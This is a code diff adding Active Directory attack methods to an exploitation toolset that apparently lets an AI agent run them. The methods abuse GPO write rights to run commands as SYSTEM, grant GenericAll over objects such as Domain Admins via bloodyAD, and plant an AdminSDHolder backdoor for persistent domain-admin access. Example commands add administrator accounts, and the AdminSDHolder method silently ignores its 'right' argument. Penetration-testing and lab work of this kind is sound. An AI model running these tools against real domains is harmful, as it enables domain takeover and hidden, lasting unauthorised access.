@@ -609,3 +609,286 @@ class ACLExploitTools(Toolset):
 
         except Exception as e:
             return f"SharpGPOAbuse failed: {e}"
+
+    @dn.tool_method
+    def pygpoabuse_immediate_task(
+        self,
+        gpo_name: str,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+        command: str,
+        task_name: str = "WindowsUpdate",
+        force: bool = True,
+    ) -> str:
+        """
+        Abuse GPO write permissions to create an immediate scheduled task.
+
+        This is a FAST PATH TO DOMAIN ADMIN when you have write access to a GPO
+        that is linked to a Domain Controller. The scheduled task executes as
+        SYSTEM on all computers where the GPO is linked.
+
+        Use when BloodHound shows:
+        - GpoEditDeleteModifySecurity on a GPO
+        - WriteProperty on a GPO
+        - WriteDacl on a GPO
+        - GenericWrite on a GPO
+
+        **CRITICAL**: If the GPO is linked to a Domain Controller, this gives
+        SYSTEM access on the DC = Domain Admin equivalent!
+
+        Args:
+            gpo_name: Name of the GPO you have write access to (e.g., "StarkWallpaper")
+            domain: Target domain (e.g., north.sevenkingdoms.local)
+            username: Username with GPO write permissions
+            password: Password for authentication
+            dc_ip: Domain controller IP address
+            command: Command to execute as SYSTEM (e.g., "net user hacker P@ss123! /add")
+            task_name: Name for the scheduled task (default: WindowsUpdate)
+            force: Force task creation without prompting (default: True)
+
+        Returns:
+            GPO abuse result - success indicates SYSTEM execution on linked computers
+
+        Example:
+            >>> pygpoabuse_immediate_task(
+            ...     gpo_name="StarkWallpaper",
+            ...     domain="north.sevenkingdoms.local",
+            ...     username="samwell.tarly",
+            ...     password="Heartsbane",  # pragma: allowlist secret
+            ...     dc_ip="10.1.2.240",
+            ...     command="net localgroup Administrators samwell.tarly /add"
+            ... )
+        """
+        # Build pygpoabuse command for immediate scheduled task
+        cmd = [
+            "pygpoabuse",
+            f"{domain}/{username}:{password}",
+            "-gpo-id",
+            gpo_name,  # pygpoabuse accepts GPO name or GUID
+            "-command",
+            command,
+            "-taskname",
+            task_name,
+            "-dc-ip",
+            dc_ip,
+        ]
+
+        if force:
+            cmd.append("-f")
+
+        try:
+            logger.info(
+                f"[*] Running pygpoabuse: creating immediate task '{task_name}' on GPO '{gpo_name}'"
+            )
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # Check for success indicators
+            success_indicators = [
+                "success",
+                "created",
+                "scheduled task",
+                "gpo modified",
+                "immediate task",
+            ]
+            if (
+                any(indicator in result.lower() for indicator in success_indicators)
+                or returncode == 0
+            ):
+                logger.info(
+                    f"[+] pygpoabuse successful: immediate task created on GPO '{gpo_name}'"
+                )
+                return (
+                    f"✅ GPO ABUSE SUCCESSFUL - IMMEDIATE SCHEDULED TASK CREATED!\n"
+                    f"→ GPO: {gpo_name}\n"
+                    f"→ Task Name: {task_name}\n"
+                    f"→ Command: {command}\n"
+                    f"→ The task will execute as SYSTEM within minutes!\n\n"
+                    f"🚨 CRITICAL: If this GPO is linked to a Domain Controller,\n"
+                    f"   you will have SYSTEM access on the DC = Domain Admin!\n\n"
+                    f"→ To force immediate execution: gpupdate /force on target\n"
+                    f"→ Or wait for automatic GPO refresh (default: 5 minutes for DCs)\n\n"
+                    f"{result}"
+                )
+
+            # Check for common errors
+            if "not found" in result.lower() or "does not exist" in result.lower():
+                return (
+                    f"❌ GPO '{gpo_name}' not found or access denied.\n"
+                    f"→ Verify GPO name with: Get-GPO -All | Select DisplayName\n"
+                    f"→ Ensure {username} has write access to the GPO\n\n"
+                    f"{result}"
+                )
+
+            if "access denied" in result.lower() or "permission" in result.lower():
+                return (
+                    f"❌ Access denied to GPO '{gpo_name}'.\n"
+                    f"→ User {username} may not have write permissions\n"
+                    f"→ Check BloodHound for correct ACL rights\n\n"
+                    f"{result}"
+                )
+
+            return f"GPO abuse result (check output for success):\n{result}"
+
+        except FileNotFoundError:
+            # pygpoabuse not installed, try alternative approach
+            logger.warning("[!] pygpoabuse not found, attempting alternative GPO modification")
+            return (
+                "❌ pygpoabuse not installed.\n"
+                "→ Install with: pip install pygpoabuse\n"
+                "→ Or use sharpgpoabuse tool as alternative\n"
+                "→ Manual option: Edit GPO via RSAT tools"
+            )
+
+        except Exception as e:
+            return f"pygpoabuse failed: {e}"
+
+    @dn.tool_method
+    def bloodyad_add_genericall(
+        self,
+        target_dn: str,
+        principal: str,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+    ) -> str:
+        """
+        Grant GenericAll permission on an AD object via bloodyAD.
+
+        Use when you have WriteDacl on an object. This grants full control
+        which enables further attacks like password reset, shadow credentials,
+        or group membership modification.
+
+        Args:
+            target_dn: Distinguished name or samAccountName of target
+            principal: User/group to grant GenericAll to
+            domain: Target domain
+            username: Your username with WriteDacl permission
+            password: Your password
+            dc_ip: Domain controller IP
+
+        Returns:
+            GenericAll grant result
+
+        Example:
+            >>> bloodyad_add_genericall(
+            ...     target_dn="Domain Admins",
+            ...     principal="attacker",
+            ...     domain="domain.local",
+            ...     username="user_with_writedacl",
+            ...     password="password",  # pragma: allowlist secret
+            ...     dc_ip="192.168.58.10"
+            ... )
+        """
+        cmd = [
+            "bloodyAD",
+            "-d",
+            domain,
+            "-u",
+            username,
+            "-p",
+            password,
+            "--host",
+            dc_ip,
+            "add",
+            "genericAll",
+            target_dn,
+            principal,
+        ]
+
+        try:
+            logger.info(f"[*] Granting GenericAll to {principal} on {target_dn}")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if "success" in result.lower() or returncode == 0:
+                logger.info(f"[+] GenericAll granted to {principal} on {target_dn}!")
+                return (
+                    f"✅ GenericAll granted!\n"
+                    f"→ {principal} now has full control over {target_dn}\n"
+                    f"→ If target is 'Domain Admins': use bloodyad_add_group_member to add yourself!\n"
+                    f"→ If target is a user: use bloodyad_set_password or pywhisker\n\n"
+                    f"{result}"
+                )
+
+            return f"GenericAll grant result:\n{result}"
+
+        except Exception as e:
+            return f"bloodyAD GenericAll failed: {e}"
+
+    @dn.tool_method
+    def adminsd_holder_add_ace(
+        self,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+        principal: str,
+        right: str = "GenericAll",
+    ) -> str:
+        """Add ACE to AdminSDHolder container for persistent privileged access.
+
+        AdminSDHolder is a special AD container that propagates ACEs to protected
+        groups (Domain Admins, Enterprise Admins, etc.) every 60 minutes via SDProp.
+        Adding GenericAll here creates a persistent backdoor that survives DA password
+        resets and group membership changes.
+
+        Args:
+            domain: Target domain (e.g., 'contoso.local')
+            username: User with GenericAll on AdminSDHolder or DA rights
+            password: Password for authentication
+            dc_ip: Domain controller IP
+            principal: User/group to grant persistent access (e.g., 'backdoor_user')
+            right: Permission to grant (default: GenericAll)
+
+        Returns:
+            Result of ACE addition - if successful, principal will have
+            persistent control over all protected groups after SDProp runs.
+        """
+        # AdminSDHolder DN is always CN=AdminSDHolder,CN=System,DC=...
+        domain_dn = ",".join(f"DC={part}" for part in domain.split("."))
+        adminsd_dn = f"CN=AdminSDHolder,CN=System,{domain_dn}"
+
+        cmd = [
+            "bloodyAD",
+            "-d",
+            domain,
+            "-u",
+            username,
+            "-p",
+            password,
+            "--host",
+            dc_ip,
+            "add",
+            "genericAll",
+            adminsd_dn,
+            principal,
+        ]
+
+        try:
+            logger.info(f"[*] Adding {right} ACE for {principal} on AdminSDHolder")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if "success" in result.lower() or returncode == 0:
+                logger.info(f"[+] AdminSDHolder backdoor planted for {principal}!")
+                return (
+                    f"✅ AdminSDHolder backdoor planted!\n"
+                    f"→ {principal} will have {right} on ALL protected groups\n"
+                    f"→ This includes: Domain Admins, Enterprise Admins, Schema Admins, etc.\n"
+                    f"→ SDProp runs every 60 minutes - backdoor propagates automatically\n"
+                    f"→ This survives password resets and group membership changes!\n\n"
+                    f"⚠️ PERSISTENCE ACHIEVED - {principal} has permanent DA-level access\n\n"
+                    f"{result}"
+                )
+
+            return f"AdminSDHolder ACE result:\n{result}"
+
+        except Exception as e:
+            return f"AdminSDHolder ACE addition failed: {e}"
